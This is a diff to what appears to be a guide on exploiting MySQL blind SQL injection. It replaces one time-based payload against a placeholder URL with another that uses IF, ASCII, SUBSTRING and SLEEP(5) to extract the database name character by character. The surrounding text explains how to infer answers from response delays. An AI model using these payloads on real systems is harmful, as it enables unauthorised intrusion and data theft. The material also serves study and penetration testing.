@@ -59,7 +59,7 @@ To exploit MySQL blind SQL injection vulnerabilities using conditional statement
 - **Craft conditional logic for data extraction**:
   - Utilize conditional statements to extract information, such as database version or name, one bit at a time by applying time delay logic to inference-based questions:
   ```bash
-  http://example.com/item?id=1' AND IF((SELECT database())='target_db', SLEEP(5), 0)-- -
+  http://example.com/item?id=1' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=100, SLEEP(5), 0)-- -
   ```
   - By comparing the response time against expected delays, determine whether the condition (e.g., `database() = 'target_db'`) is true, slowly revealing the desired database name.
 
